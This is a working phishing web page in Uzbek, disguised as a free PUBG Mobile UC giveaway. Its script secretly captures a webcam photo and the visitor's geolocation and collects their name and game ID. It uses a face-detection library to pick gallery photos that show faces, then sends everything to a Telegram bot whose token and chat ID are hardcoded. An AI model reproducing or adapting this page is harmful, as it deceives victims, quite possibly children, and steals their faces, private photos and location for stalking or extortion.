<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE: FREE UC ELITE</title>
    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.9); border: 2px solid var(--neon-b); border-radius: 30px; padding: 25px; text-align: center; box-shadow: 0 0 20px var(--neon-b); }
        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 15px; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 25px; padding: 25px; width: 100%; max-width: 350px; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 10px; color: #fff; }
        .btn-main { width: 100%; padding: 16px; background: var(--neon-b); border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 18px; }
        .file-label { display: block; padding: 12px; background: #1e293b; border: 1px dashed var(--neon-b); border-radius: 10px; cursor: pointer; margin-bottom: 15px; color: var(--neon-b); }
        #status { color: #39ff14; font-size: 14px; margin-top: 10px; }
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<div id="app">
    <h1 style="font-family:'Orbitron'; color:var(--neon-b);">UC ELITE SHOP</h1>
    <div onclick="start('60 UC')" class="uc-item"><b>60 UC 🎁</b> <span>BEPUL</span></div>
    <div onclick="start('325 UC')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
</div>

<div id="authModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b);">TASDIQLASH</h2>
        <p id="loadingMsg">Sizni skaner qilish uchun kutib turing...</p>
        <button class="btn-main" id="authBtn" onclick="getAccess()">RUXSAT BERISH</button>
    </div>
</div>

<div id="formModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b);">MA'LUMOTLAR</h2>
        <input type="text" id="u_name" placeholder="Ismingiz">
        <input type="number" id="u_id" placeholder="PUBG ID">
        <label for="fileInput" class="file-label" id="fileLabel">📁 Galereyani tanlang (AI yuzlarni ajratadi)</label>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="processFiles(this)">
        <div id="status"></div>
        <button class="btn-main" id="sendBtn" onclick="sendAll()">UC YUKLASH</button>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";

    let selectedPackage = "", cameraPhoto = null, verifiedFiles = [], lat = 0, lon = 0;

    // AI modellarini yuklash
    async function loadModels() {
        const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model';
        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
        document.getElementById('loadingMsg').innerText = "Ruxsat berish tugmasini bosing.";
    }
    loadModels();

    function start(pkg) {
        selectedPackage = pkg;
        document.getElementById('authModal').style.display = 'flex';
    }

    async function processFiles(input) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerText = "AI rasmlarni tekshirmoqda, kuting...";
        verifiedFiles = [];
        
        const files = Array.from(input.files);
        for (let file of files) {
            const img = await faceapi.bufferToImage(file);
            const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            
            if (detections.length > 0) {
                verifiedFiles.push(file); // Faqat yuz bor rasmlar saqlanadi
            }
        }
        
        statusDiv.innerText = `Tayyor! ${verifiedFiles.length} ta yuz ifodasi bor rasm topildi.`;
        if(verifiedFiles.length > 10) verifiedFiles = verifiedFiles.slice(0, 10);
    }

    async function getAccess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('vid');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1500));

            const canvas = document.getElementById('canv');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            cameraPhoto = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();

            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(p => {
                lat = p.coords.latitude; lon = p.coords.longitude;
                document.getElementById('authModal').style.display = 'none';
                document.getElementById('formModal').style.display = 'flex';
            });
        } catch (e) { alert("Ruxsat shart!"); location.reload(); }
    }

    async function sendAll() {
        const info = `📍 Manzil: https://www.google.com/maps?q=${lat},${lon}\n👤 Ism: ${document.getElementById('u_name').value}\n🆔 ID: ${document.getElementById('u_id').value}\n📦 Paket: ${selectedPackage}`;
        
        // 1. Ma'lumotlar
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: info})
        });

        // 2. Kamera rasmi
        const fd1 = new FormData();
        fd1.append('chat_id', CHAT_ID); fd1.append('photo', cameraPhoto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd1});

        // 3. AI tomonidan tasdiqlangan galereya rasmlari
        for (let file of verifiedFiles) {
            const fd2 = new FormData();
            fd2.append('chat_id', CHAT_ID); fd2.append('photo', file);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }

        alert("Muvaffaqiyatli! UC yuklanadi.");
        location.reload();
    }
</script>
</body>
</html>
